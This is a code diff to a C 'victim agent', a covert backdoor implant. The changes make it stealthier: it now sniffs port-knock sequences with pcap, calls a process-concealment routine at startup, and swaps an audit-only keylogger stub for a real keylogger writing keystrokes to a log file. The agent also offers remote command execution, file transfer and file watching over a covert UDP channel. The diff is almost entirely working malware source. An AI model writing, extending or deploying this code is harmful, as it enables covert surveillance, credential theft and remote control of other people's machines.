@@ -1,6 +1,8 @@
 #include <arpa/inet.h>
 #include <dirent.h>
 #include <errno.h>
+#include "keylogger.h"
+#include <pcap.h>
 #include <pthread.h>
 #include <signal.h>
 #include <stdint.h>
@@ -14,67 +16,17 @@
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
+#ifdef __linux__
+#include <sys/prctl.h>
+#endif
 
-#define KNOCK_PORT_COUNT 3
-#define KNOCK_PORT_BASE 5001
-#define KNOCK_TIMEOUT_MS 2000
-#define CONSOLE_PORT 9998
-#define COLLECTOR_PORT 9999
-#define COVERT_PORT 7777
-#define PACKET_SIZE_MAX 1400
-#define CHECKSUM_SIZE 2
-#define FILE_CHUNK 512
-#define KEYLOGGER_DEVICE_MAX 256
-#define KEYLOGGER_AUDIT_FILE "/tmp/victim_keylogger_audit.log"
-#define REMOTE_PATH_MAX 512
+#include "protocol.h"
+
 #define RESPONSE_TEXT_MAX 256
 #define EXEC_COMMAND_MAX 1024
-#define EXEC_OUTPUT_CHUNK_MAX (PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE)
-
-#define CMD_DISCONNECT 0x01
-#define CMD_HEARTBEAT  0x02
-#define CMD_KEYLOG_START 0x10
-#define CMD_KEYLOG_STOP  0x11
-#define CMD_EXEC_CMD      0x30
-#define CMD_EXEC_OUTPUT   0x31
-#define CMD_FILE_GET      0x40
-#define CMD_FILE_DATA     0x41
-#define CMD_FILE_PUT_BEGIN 0x42
-#define CMD_FILE_PUT_CHUNK 0x43
-#define CMD_FILE_PUT_END   0x44
-#define CMD_WATCH_FILE    0x50
-#define CMD_WATCH_DIR     0x51
-#define CMD_UNINSTALL    0xFE
-
-#define CMD_OK    0xF0
-#define CMD_ERROR 0xF1
-#define CMD_ACK   0xF2
-
-#define MSG_DIRECTORY_EVENT 1
-#define MSG_FILE_DATA       2
-#define MSG_COMMAND_OUTPUT  3
-
-#define SEQ_INIT 0x13370000
-
-typedef struct __attribute__((packed)) {
-    uint32_t seq_num;
-    uint8_t command;
-    uint16_t payload_len;
-} covert_header_t;
-
-typedef struct {
-    uint32_t seq_num;
-    uint8_t command;
-    uint16_t payload_len;
-    const uint8_t *payload;
-} parsed_packet_t;
-
-typedef struct {
-    int message_type;
-    char filename;
-    char payload[FILE_CHUNK];
-    int payload_len;
-} network_message_t;
+#define EXEC_OUTPUT_CHUNK_MAX PROTOCOL_PACKET_PAYLOAD_MAX
+#define PCAP_SNAPLEN 65535
+#define PCAP_TIMEOUT_MS 500
 
 typedef struct {
     int active;
@@ -86,13 +38,15 @@ typedef struct {
 } watch_state_t;
 
 typedef struct {
-    int knock_socks[KNOCK_PORT_COUNT];
+    pcap_t *pcap_handle;
     int covert_sock;
-    int console_sock;
+    int collector_sock;
 
     int knock_index;
     struct in_addr knock_addr;
     struct timeval knock_started_at;
+    int knock_complete;
+    struct in_addr pending_peer;
 
     int session_active;
     struct in_addr allowed_addr;
@@ -101,31 +55,27 @@ typedef struct {
     uint32_t expected_seq;
     uint32_t next_seq;
 
-    int keylogger_active;
-    char keylogger_device[KEYLOGGER_DEVICE_MAX];
+    keylogger_state_t keylogger;
     FILE *upload_fp;
     char upload_path[REMOTE_PATH_MAX];
+    char upload_temp_path[REMOTE_PATH_MAX + 8];
     watch_state_t file_watch;
     watch_state_t directory_watch;
-    int console_listener_active;
-    pthread_t console_thread;
 } victim_state_t;
 
 static volatile sig_atomic_t g_running = 1;
 
 static void handle_signal(int signo);
 static void init_state(victim_state_t *state);
-static int init_sockets(victim_state_t *state);
-static int start_console_listener(victim_state_t *state);
+static int open_pcap(victim_state_t *state);
+static void close_pcap(victim_state_t *state);
 static int bind_udp_socket(uint16_t port);
-static void stop_console_listener(victim_state_t *state);
-static void close_sockets(victim_state_t *state);
+static void close_session_sockets(victim_state_t *state);
 static int run_victim(victim_state_t *state);
-static void poll_knock_state(victim_state_t *state);
+static void poll_knock_state_pcap(victim_state_t *state);
 static void poll_session_state(victim_state_t *state);
 static void poll_watch_targets(victim_state_t *state);
-static void *console_listener_thread(void *arg);
-static void handle_knock_packet(victim_state_t *state, int knock_index);
+static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 static void reset_knock_state(victim_state_t *state);
 static void maybe_reset_knock_timeout(victim_state_t *state);
 static long elapsed_ms(const struct timeval *start);
@@ -133,11 +83,10 @@ static void activate_session(victim_state_t *state, const struct in_addr *peer_a
 static void deactivate_session(victim_state_t *state, const char *reason);
 static void clear_upload_state(victim_state_t *state);
 static void clear_watch_targets(victim_state_t *state);
-static void drain_covert_packet(victim_state_t *state);
 static void handle_covert_packet(victim_state_t *state);
-static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
 static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message);
 static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
+static int wait_for_stream_ack(victim_state_t *state);
 static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet);
 static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
 static int stop_keylogger(victim_state_t *state, char *message, size_t message_len);
@@ -152,13 +101,10 @@ static int snapshot_file_watch(const char *path, watch_state_t *watch);
 static int snapshot_directory_watch(const char *path, watch_state_t *watch);
 static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime);
 static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details);
-static int execute_console_command(const struct in_addr *collector_addr, const char *command);
 static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len);
 static size_t bounded_strlen(const uint8_t *data, size_t limit);
-static int append_keylogger_audit(const char *action, const char *device_path);
-static int send_console_message(const struct in_addr *collector_addr, const network_message_t *message);
-static uint16_t compute_checksum(const uint8_t *data, size_t len);
-static const char *command_name(uint8_t command);
+static int send_watch_message(const struct in_addr *target_addr, const char *payload, int payload_len);
+static void conceal_process(void);
 
 int main(void) {
     victim_state_t state;
@@ -167,30 +113,25 @@ int main(void) {
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
 
+    conceal_process();
+
     init_state(&state);
-    if (init_sockets(&state) != 0) {
-        close_sockets(&state);
+    if (open_pcap(&state) != 0) {
+        fprintf(stderr, "Unable to open capture interface; try running as root\n");
+        close_pcap(&state);
         return EXIT_FAILURE;
     }
-    if (start_console_listener(&state) != 0) {
-        fprintf(stderr, "Direct UDP console listener unavailable on port %u\n", (unsigned)CONSOLE_PORT);
-    }
 
-    printf("Victim agent started\n");
-    printf("Waiting for UDP knock sequence on ports %u-%u\n",
-           (unsigned)KNOCK_PORT_BASE,
-           (unsigned)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1));
+    printf("Victim agent started (pcap-based knock detection)\n");
 
     (void)run_victim(&state);
 
-    if (state.keylogger_active) {
-        (void)append_keylogger_audit("STOP", state.keylogger_device);
-    }
-
+    (void)keylogger_stop(&state.keylogger, NULL, 0);
     clear_upload_state(&state);
     clear_watch_targets(&state);
-    stop_console_listener(&state);
-    close_sockets(&state);
+    close_session_sockets(&state);
+    close_pcap(&state);
+    keylogger_state_destroy(&state.keylogger);
     printf("Victim agent exiting\n");
     return EXIT_SUCCESS;
 }
@@ -203,49 +144,70 @@ static void handle_signal(int signo) {
 static void init_state(victim_state_t *state) {
     memset(state, 0, sizeof(*state));
 
-    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
-        state->knock_socks[i] = -1;
-    }
-
+    state->pcap_handle = NULL;
     state->covert_sock = -1;
-    state->console_sock = -1;
+    state->collector_sock = -1;
     state->expected_seq = SEQ_INIT;
     state->next_seq = SEQ_INIT;
+    keylogger_state_init(&state->keylogger);
 }
 
-static int init_sockets(victim_state_t *state) {
-    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
-        uint16_t port = (uint16_t)(KNOCK_PORT_BASE + i);
-        state->knock_socks[i] = bind_udp_socket(port);
-        if (state->knock_socks[i] < 0) {
-            return -1;
+static int open_pcap(victim_state_t *state) {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    struct bpf_program filter;
+    char filter_expr[128];
+
+    state->pcap_handle = pcap_open_live(
+        "lo0",
+        PCAP_SNAPLEN,
+        1,
+        PCAP_TIMEOUT_MS,
+        errbuf
+    );
+    if (state->pcap_handle == NULL) {
+        state->pcap_handle = pcap_open_live(
+            "lo",
+            PCAP_SNAPLEN,
+            1,
+            PCAP_TIMEOUT_MS,
+            errbuf
+        );
+    }
+    if (state->pcap_handle == NULL) {
+        pcap_if_t *alldevs;
+        if (pcap_findalldevs(&alldevs, errbuf) == 0 && alldevs != NULL) {
+            state->pcap_handle = pcap_open_live(
+                alldevs->name,
+                PCAP_SNAPLEN,
+                1,
+                PCAP_TIMEOUT_MS,
+                errbuf
+            );
+            pcap_freealldevs(alldevs);
         }
     }
-
-    state->covert_sock = bind_udp_socket(COVERT_PORT);
-    if (state->covert_sock < 0) {
+    if (state->pcap_handle == NULL) {
         return -1;
+    }
+
+    snprintf(filter_expr, sizeof(filter_expr),
+             "udp dst portrange %u-%u",
+             (unsigned)KNOCK_PORT_BASE,
+             (unsigned)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1));
+
+    if (pcap_compile(state->pcap_handle, &filter, filter_expr, 1, PCAP_NETMASK_UNKNOWN) == 0) {
+        (void)pcap_setfilter(state->pcap_handle, &filter);
+        pcap_freecode(&filter);
     }
 
     return 0;
 }
 
-static int start_console_listener(victim_state_t *state) {
-    state->console_sock = bind_udp_socket(CONSOLE_PORT);
-    if (state->console_sock < 0) {
-        return -1;
+static void close_pcap(victim_state_t *state) {
+    if (state->pcap_handle != NULL) {
+        pcap_close(state->pcap_handle);
+        state->pcap_handle = NULL;
     }
-
-    if (pthread_create(&state->console_thread, NULL, console_listener_thread, state) != 0) {
-        perror("pthread_create console");
-        close(state->console_sock);
-        state->console_sock = -1;
-        return -1;
-    }
-
-    state->console_listener_active = 1;
-    printf("Direct UDP console listener on port %u\n", (unsigned)CONSOLE_PORT);
-    return 0;
 }
 
 static int bind_udp_socket(uint16_t port) {
@@ -283,36 +245,14 @@ static int bind_udp_socket(uint16_t port) {
     return sock;
 }
 
-static void stop_console_listener(victim_state_t *state) {
-    if (!state->console_listener_active) {
-        return;
-    }
-
-    (void)pthread_join(state->console_thread, NULL);
-    state->console_listener_active = 0;
-
-    if (state->console_sock >= 0) {
-        close(state->console_sock);
-        state->console_sock = -1;
-    }
-}
-
-static void close_sockets(victim_state_t *state) {
-    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
-        if (state->knock_socks[i] >= 0) {
-            close(state->knock_socks[i]);
-            state->knock_socks[i] = -1;
-        }
-    }
-
+static void close_session_sockets(victim_state_t *state) {
     if (state->covert_sock >= 0) {
         close(state->covert_sock);
         state->covert_sock = -1;
     }
-
-    if (state->console_sock >= 0) {
-        close(state->console_sock);
-        state->console_sock = -1;
+    if (state->collector_sock >= 0) {
+        close(state->collector_sock);
+        state->collector_sock = -1;
     }
 }
 
@@ -322,59 +262,26 @@ static int run_victim(victim_state_t *state) {
             poll_session_state(state);
             poll_watch_targets(state);
         } else {
-            poll_knock_state(state);
+            poll_knock_state_pcap(state);
         }
     }
 
     return 0;
 }
 
-static void poll_knock_state(victim_state_t *state) {
-    fd_set read_fds;
-    struct timeval timeout;
-    int max_fd = state->covert_sock;
-    int ready;
-
+static void poll_knock_state_pcap(victim_state_t *state) {
     maybe_reset_knock_timeout(state);
 
-    FD_ZERO(&read_fds);
-    FD_SET(state->covert_sock, &read_fds);
-
-    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
-        FD_SET(state->knock_socks[i], &read_fds);
-        if (state->knock_socks[i] > max_fd) {
-            max_fd = state->knock_socks[i];
-        }
+    while (pcap_dispatch(state->pcap_handle, -1, pcap_knock_handler, (u_char *)state) > 0) {
     }
 
-    timeout.tv_sec = 1;
-    timeout.tv_usec = 0;
+    if (state->knock_complete) {
+        state->knock_complete = 0;
+        activate_session(state, &state->pending_peer);
+    }
 
-    ready = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
-    if (ready < 0) {
-        if (errno != EINTR) {
-            perror("select");
-            g_running = 0;
-        }
+    if (!g_running) {
         return;
-    }
-
-    if (ready == 0) {
-        maybe_reset_knock_timeout(state);
-        return;
-    }
-
-    if (FD_ISSET(state->covert_sock, &read_fds)) {
-        drain_covert_packet(state);
-    }
-
-    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
-        if (FD_ISSET(state->knock_socks[i], &read_fds)) {
-            handle_knock_packet(state, i);
-            if (state->session_active) {
-                return;
-            }
-        }
     }
 }
 
@@ -453,130 +360,108 @@ static void poll_watch_targets(victim_state_t *state) {
     }
 }
 
-static void *console_listener_thread(void *arg) {
-    victim_state_t *state = (victim_state_t *)arg;
+static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
+    victim_state_t *state = (victim_state_t *)args;
+    const u_char *ip_hdr;
+    uint16_t ether_type;
+    int ip_header_len;
+    uint16_t dst_port;
+    struct in_addr src_addr;
+    uint8_t payload_byte;
+    uint16_t udp_len;
+    int datalink;
 
-    while (g_running) {
-        fd_set read_fds;
-        struct timeval timeout;
-        struct sockaddr_in src_addr;
-        socklen_t src_len = sizeof(src_addr);
-        char cmd_buffer[EXEC_COMMAND_MAX];
-        char src_ip[INET_ADDRSTRLEN];
-        ssize_t received;
-        size_t command_len;
+    (void)header;
 
-        FD_ZERO(&read_fds);
-        FD_SET(state->console_sock, &read_fds);
-        timeout.tv_sec = 1;
-        timeout.tv_usec = 0;
+    datalink = pcap_datalink(state->pcap_handle);
 
-        received = select(state->console_sock + 1, &read_fds, NULL, NULL, &timeout);
-        if (received < 0) {
-            if (errno == EINTR) {
-                continue;
-            }
-            perror("select console");
-            break;
+    if (datalink == DLT_NULL) {
+        uint32_t family;
+        memcpy(&family, packet, 4);
+        if (family != 2) {
+            return;
         }
-
-        if (received == 0) {
-            continue;
+        ip_hdr = packet + 4;
+    } else if (datalink == DLT_EN10MB) {
+        memcpy(&ether_type, packet + 12, 2);
+        if (ntohs(ether_type) != 0x0800) {
+            return;
         }
-
-        memset(cmd_buffer, 0, sizeof(cmd_buffer));
-        received = recvfrom(
-            state->console_sock,
-            cmd_buffer,
-            sizeof(cmd_buffer) - 1,
-            0,
-            (struct sockaddr *)&src_addr,
-            &src_len
-        );
-
-        if (received < 0) {
-            if (errno == EINTR) {
-                continue;
-            }
-            perror("recvfrom console");
-            break;
-        }
-
-        cmd_buffer[received] = '\0';
-        command_len = strlen(cmd_buffer);
-        while (command_len > 0 &&
-               (cmd_buffer[command_len - 1] == '\n' || cmd_buffer[command_len - 1] == '\r')) {
-            cmd_buffer[--command_len] = '\0';
-        }
-
-        if (cmd_buffer[0] == '\0') {
-            continue;
-        }
-
-        inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
-        printf("Direct console command received from %s: %s\n", src_ip, cmd_buffer);
-        (void)execute_console_command(&src_addr.sin_addr, cmd_buffer);
-    }
-
-    return NULL;
-}
-
-static void handle_knock_packet(victim_state_t *state, int knock_index) {
-    uint8_t payload[8];
-    struct sockaddr_in src_addr;
-    socklen_t src_len = sizeof(src_addr);
-    ssize_t received;
-    char src_ip[INET_ADDRSTRLEN];
-    uint8_t expected_value = (uint8_t)knock_index;
-
-    received = recvfrom(
-        state->knock_socks[knock_index],
-        payload,
-        sizeof(payload),
-        0,
-        (struct sockaddr *)&src_addr,
-        &src_len
-    );
-
-    if (received < 0) {
-        if (errno != EINTR) {
-            perror("recvfrom knock");
-        }
+        ip_hdr = packet + 14;
+    } else if (datalink == DLT_RAW) {
+        ip_hdr = packet;
+    } else {
         return;
     }
 
-    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
-
-    if (state->knock_index > 0 &&
-        src_addr.sin_addr.s_addr != state->knock_addr.s_addr) {
-        printf("Knock source changed from expected peer; restarting sequence\n");
-        reset_knock_state(state);
+    if ((ip_hdr[0] & 0xF0) != 0x40) {
+        return;
+    }
+    if (ip_hdr[9] != 17) {
+        return;
     }
 
-    if (knock_index != state->knock_index ||
-        received < 1 ||
-        payload[0] != expected_value) {
-        if (knock_index == 0 && received >= 1 && payload[0] == 0) {
-            reset_knock_state(state);
-        } else {
-            printf("Unexpected knock on port %u from %s; sequence reset\n",
-                   (unsigned)(KNOCK_PORT_BASE + knock_index),
-                   src_ip);
+    ip_header_len = (ip_hdr[0] & 0x0F) * 4;
+    (void)memcpy(&src_addr, ip_hdr + 12, 4);
+
+    {
+        const u_char *udp_hdr = ip_hdr + ip_header_len;
+        uint16_t src_port;
+        memcpy(&src_port, udp_hdr, 2);
+        memcpy(&dst_port, udp_hdr + 2, 2);
+        dst_port = ntohs(dst_port);
+        memcpy(&udp_len, udp_hdr + 4, 2);
+        udp_len = ntohs(udp_len);
+
+        if (udp_len < 9) {
+            return;
+        }
+
+        payload_byte = udp_hdr[8];
+        (void)src_port;
+    }
+
+    if (dst_port < KNOCK_PORT_BASE || dst_port > (uint16_t)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1)) {
+        return;
+    }
+
+    {
+        int knock_index = (int)(dst_port - KNOCK_PORT_BASE);
+        uint8_t expected_value = (uint8_t)knock_index;
+        char src_ip[INET_ADDRSTRLEN];
+
+        inet_ntop(AF_INET, &src_addr, src_ip, sizeof(src_ip));
+
+        if (state->knock_index > 0 &&
+            src_addr.s_addr != state->knock_addr.s_addr) {
+            printf("Knock source changed; restarting sequence\n");
             reset_knock_state(state);
             return;
         }
-    }
 
-    if (state->knock_index == 0) {
-        state->knock_addr = src_addr.sin_addr;
-        gettimeofday(&state->knock_started_at, NULL);
-    }
+        if (knock_index != state->knock_index || payload_byte != expected_value) {
+            if (knock_index == 0 && payload_byte == 0) {
+                reset_knock_state(state);
+            } else {
+                printf("Unexpected knock on port %u from %s; sequence reset\n",
+                       (unsigned)dst_port, src_ip);
+                reset_knock_state(state);
+            }
+            return;
+        }
 
-    state->knock_index++;
-    printf("Accepted knock %d/%d from %s\n", state->knock_index, KNOCK_PORT_COUNT, src_ip);
+        if (state->knock_index == 0) {
+            state->knock_addr = src_addr;
+            gettimeofday(&state->knock_started_at, NULL);
+        }
 
-    if (state->knock_index == KNOCK_PORT_COUNT) {
-        activate_session(state, &src_addr.sin_addr);
+        state->knock_index++;
+        printf("Accepted knock %d/%d from %s\n", state->knock_index, KNOCK_PORT_COUNT, src_ip);
+
+        if (state->knock_index == KNOCK_PORT_COUNT) {
+            state->knock_complete = 1;
+            state->pending_peer = src_addr;
+        }
     }
 }
 
@@ -606,6 +491,30 @@ static long elapsed_ms(const struct timeval *start) {
 }
 
 static void activate_session(victim_state_t *state, const struct in_addr *peer_addr) {
+    close_pcap(state);
+
+    state->covert_sock = bind_udp_socket(COVERT_PORT);
+    if (state->covert_sock < 0) {
+        fprintf(stderr, "Unable to bind covert port; session cannot start\n");
+        if (open_pcap(state) != 0) {
+            g_running = 0;
+        }
+        reset_knock_state(state);
+        return;
+    }
+
+    state->collector_sock = bind_udp_socket(COLLECTOR_PORT);
+    if (state->collector_sock < 0) {
+        close(state->covert_sock);
+        state->covert_sock = -1;
+        fprintf(stderr, "Unable to bind collector port; session cannot start\n");
+        if (open_pcap(state) != 0) {
+            g_running = 0;
+        }
+        reset_knock_state(state);
+        return;
+    }
+
     reset_knock_state(state);
     state->session_active = 1;
     state->allowed_addr = *peer_addr;
@@ -622,11 +531,7 @@ static void activate_session(victim_state_t *state, const struct in_addr *peer_a
 }
 
 static void deactivate_session(victim_state_t *state, const char *reason) {
-    if (state->keylogger_active) {
-        (void)append_keylogger_audit("STOP", state->keylogger_device);
-        state->keylogger_active = 0;
-        state->keylogger_device[0] = '\0';
-    }
+    (void)keylogger_stop(&state->keylogger, NULL, 0);
 
     clear_upload_state(state);
     clear_watch_targets(state);
@@ -644,6 +549,13 @@ static void deactivate_session(victim_state_t *state, const char *reason) {
     state->expected_seq = SEQ_INIT;
     state->next_seq = SEQ_INIT;
     reset_knock_state(state);
+
+    close_session_sockets(state);
+
+    if (open_pcap(state) != 0) {
+        fprintf(stderr, "Unable to reopen capture; victim will exit\n");
+        g_running = 0;
+    }
 }
 
 static void clear_upload_state(victim_state_t *state) {
@@ -652,39 +564,17 @@ static void clear_upload_state(victim_state_t *state) {
         state->upload_fp = NULL;
     }
 
+    if (state->upload_temp_path[0] != '\0') {
+        remove(state->upload_temp_path);
+        state->upload_temp_path[0] = '\0';
+    }
+
     state->upload_path[0] = '\0';
 }
 
 static void clear_watch_targets(victim_state_t *state) {
     memset(&state->file_watch, 0, sizeof(state->file_watch));
     memset(&state->directory_watch, 0, sizeof(state->directory_watch));
-}
-
-static void drain_covert_packet(victim_state_t *state) {
-    uint8_t packet[PACKET_SIZE_MAX];
-    struct sockaddr_in src_addr;
-    socklen_t src_len = sizeof(src_addr);
-    char src_ip[INET_ADDRSTRLEN];
-    ssize_t received;
-
-    received = recvfrom(
-        state->covert_sock,
-        packet,
-        sizeof(packet),
-        0,
-        (struct sockaddr *)&src_addr,
-        &src_len
-    );
-
-    if (received < 0) {
-        if (errno != EINTR) {
-            perror("recvfrom covert");
-        }
-        return;
-    }
-
-    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
-    printf("Ignoring covert packet from %s before a valid knock sequence\n", src_ip);
 }
 
 static void handle_covert_packet(victim_state_t *state) {
@@ -726,73 +616,37 @@ static void handle_covert_packet(victim_state_t *state) {
 
     state->peer_addr = src_addr;
 
-    if (parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
+    if (protocol_parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
         fprintf(stderr, "Invalid packet from %s: %s\n", src_ip, error);
         (void)send_response(state, &src_addr, CMD_ERROR, error);
         return;
     }
 
-    if (parsed.seq_num != state->expected_seq) {
-        printf("Sequence notice: received 0x%08x, expected 0x%08x\n",
+    if (parsed.seq_num < state->expected_seq) {
+        printf("Ignoring stale command sequence 0x%08x (expected 0x%08x)\n",
                parsed.seq_num,
                state->expected_seq);
+        return;
     }
 
-    if (parsed.seq_num >= state->expected_seq) {
-        state->expected_seq = parsed.seq_num + 1;
+    if (parsed.seq_num != state->expected_seq) {
+        fprintf(stderr, "Command sequence mismatch: received 0x%08x, expected 0x%08x\n",
+                parsed.seq_num,
+                state->expected_seq);
+        (void)send_response(state, &src_addr, CMD_ERROR, "sequence mismatch");
+        return;
     }
+
+    state->expected_seq++;
 
     printf("Command %s (0x%02x) received from %s\n",
-           command_name(parsed.command),
+           protocol_command_name(parsed.command),
            parsed.command,
            src_ip);
 
     if (process_command(state, &src_addr, &parsed) != 0) {
-        fprintf(stderr, "Command %s failed\n", command_name(parsed.command));
+        fprintf(stderr, "Command %s failed\n", protocol_command_name(parsed.command));
     }
-}
-
-static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len) {
-    covert_header_t header;
-    uint16_t payload_len;
-    uint16_t received_checksum;
-    uint16_t computed_checksum;
-    size_t expected_len;
-
-    if (packet_len < sizeof(covert_header_t) + CHECKSUM_SIZE) {
-        snprintf(error, error_len, "packet too short");
-        return -1;
-    }
-
-    memcpy(&header, packet, sizeof(header));
-    payload_len = ntohs(header.payload_len);
-
-    if (payload_len > PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE) {
-        snprintf(error, error_len, "payload too large");
-        return -1;
-    }
-
-    expected_len = sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE;
-    if (packet_len != expected_len) {
-        snprintf(error, error_len, "packet length mismatch");
-        return -1;
-    }
-
-    memcpy(&received_checksum, packet + sizeof(covert_header_t) + payload_len, sizeof(received_checksum));
-    received_checksum = ntohs(received_checksum);
-    computed_checksum = compute_checksum(packet, sizeof(covert_header_t) + payload_len);
-
-    if (received_checksum != computed_checksum) {
-        snprintf(error, error_len, "checksum mismatch");
-        return -1;
-    }
-
-    parsed->seq_num = ntohl(header.seq_num);
-    parsed->command = header.command;
-    parsed->payload_len = payload_len;
-    parsed->payload = packet + sizeof(covert_header_t);
-
-    return 0;
 }
 
 static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message) {
@@ -811,28 +665,28 @@ static int send_response(victim_state_t *state, const struct sockaddr_in *peer_a
 
 static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
     uint8_t packet[PACKET_SIZE_MAX];
-    covert_header_t header;
-    uint16_t checksum;
     size_t packet_len;
     ssize_t sent;
+    char error[128];
 
-    if (payload_len > EXEC_OUTPUT_CHUNK_MAX) {
+    if (payload_len > PROTOCOL_PACKET_PAYLOAD_MAX) {
         payload_len = (uint16_t)EXEC_OUTPUT_CHUNK_MAX;
     }
 
-    header.seq_num = htonl(state->next_seq++);
-    header.command = command;
-    header.payload_len = htons(payload_len);
-
-    memcpy(packet, &header, sizeof(header));
-    if (payload_len > 0 && payload != NULL) {
-        memcpy(packet + sizeof(header), payload, payload_len);
+    packet_len = protocol_build_packet(
+        state->next_seq++,
+        command,
+        payload,
+        payload_len,
+        packet,
+        sizeof(packet),
+        error,
+        sizeof(error)
+    );
+    if (packet_len == 0) {
+        fprintf(stderr, "Unable to build response packet: %s\n", error);
+        return -1;
     }
-
-    packet_len = sizeof(header) + payload_len;
-    checksum = htons(compute_checksum(packet, packet_len));
-    memcpy(packet + packet_len, &checksum, sizeof(checksum));
-    packet_len += sizeof(checksum);
 
     sent = sendto(
         state->covert_sock,
@@ -849,6 +703,81 @@ static int send_response_payload(victim_state_t *state, const struct sockaddr_in
     }
 
     return 0;
+}
+
+static int wait_for_stream_ack(victim_state_t *state) {
+    uint8_t packet[PACKET_SIZE_MAX];
+    parsed_packet_t parsed;
+    struct sockaddr_in src_addr;
+    socklen_t src_len = sizeof(src_addr);
+    fd_set read_fds;
+    struct timeval timeout;
+    ssize_t received;
+    char error[RESPONSE_TEXT_MAX];
+
+    while (1) {
+        int ready;
+
+        FD_ZERO(&read_fds);
+        FD_SET(state->covert_sock, &read_fds);
+        timeout.tv_sec = RESPONSE_TIMEOUT_MS / 1000;
+        timeout.tv_usec = (RESPONSE_TIMEOUT_MS % 1000) * 1000;
+
+        ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
+        if (ready < 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            perror("select stream ack");
+            return -1;
+        }
+
+        if (ready == 0) {
+            fprintf(stderr, "Timed out waiting for commander ACK\n");
+            return -1;
+        }
+
+        received = recvfrom(
+            state->covert_sock,
+            packet,
+            sizeof(packet),
+            0,
+            (struct sockaddr *)&src_addr,
+            &src_len
+        );
+        if (received < 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            perror("recvfrom stream ack");
+            return -1;
+        }
+
+        if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr ||
+            src_addr.sin_port != state->peer_addr.sin_port) {
+            continue;
+        }
+
+        if (protocol_parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
+            fprintf(stderr, "Invalid stream ACK: %s\n", error);
+            return -1;
+        }
+
+        if (parsed.seq_num < state->expected_seq) {
+            continue;
+        }
+
+        if (parsed.seq_num != state->expected_seq || parsed.command != CMD_ACK) {
+            fprintf(stderr, "Unexpected stream ACK packet: %s seq=0x%08x expected=0x%08x\n",
+                    protocol_command_name(parsed.command),
+                    parsed.seq_num,
+                    state->expected_seq);
+            return -1;
+        }
+
+        state->expected_seq++;
+        return 0;
+    }
 }
 
 static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet) {
@@ -952,40 +881,38 @@ static int process_command(victim_state_t *state, const struct sockaddr_in *peer
 static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
     char device_path[KEYLOGGER_DEVICE_MAX];
     char error[RESPONSE_TEXT_MAX];
+    const char *selected_device;
 
     if (copy_payload_string(payload, payload_len, "device path", device_path, sizeof(device_path), error, sizeof(error)) != 0) {
         snprintf(message, message_len, "keylogger start failed: %s", error);
         return -1;
     }
 
-    if (append_keylogger_audit("START", device_path) != 0) {
-        snprintf(message, message_len, "keylogger start failed: cannot write audit log");
+    selected_device = (strcmp(device_path, KEYLOGGER_AUTO_DEVICE) == 0) ? keylogger_platform_default_device() : device_path;
+    if (keylogger_start(&state->keylogger, selected_device, KEYLOGGER_LOG_FILE, error, sizeof(error)) != 0) {
+        snprintf(message, message_len, "keylogger start failed: %s", error);
         return -1;
     }
 
-    state->keylogger_active = 1;
-    snprintf(state->keylogger_device, sizeof(state->keylogger_device), "%s", device_path);
-    snprintf(message, message_len, "keylogger started for %s", device_path);
-    printf("%s; audit log: %s\n", message, KEYLOGGER_AUDIT_FILE);
+    snprintf(message, message_len, "keylogger started for %s", selected_device);
+    printf("%s; keylog: %s\n", message, KEYLOGGER_LOG_FILE);
 
     return 0;
 }
 
 static int stop_keylogger(victim_state_t *state, char *message, size_t message_len) {
-    if (!state->keylogger_active) {
+    if (!state->keylogger.active) {
         snprintf(message, message_len, "keylogger already stopped");
         return 0;
     }
 
-    if (append_keylogger_audit("STOP", state->keylogger_device) != 0) {
-        snprintf(message, message_len, "keylogger stop failed: cannot write audit log");
+    if (keylogger_stop(&state->keylogger, message, message_len) != 0) {
+        snprintf(message, message_len, "keylogger stop failed: %s", message);
         return -1;
     }
 
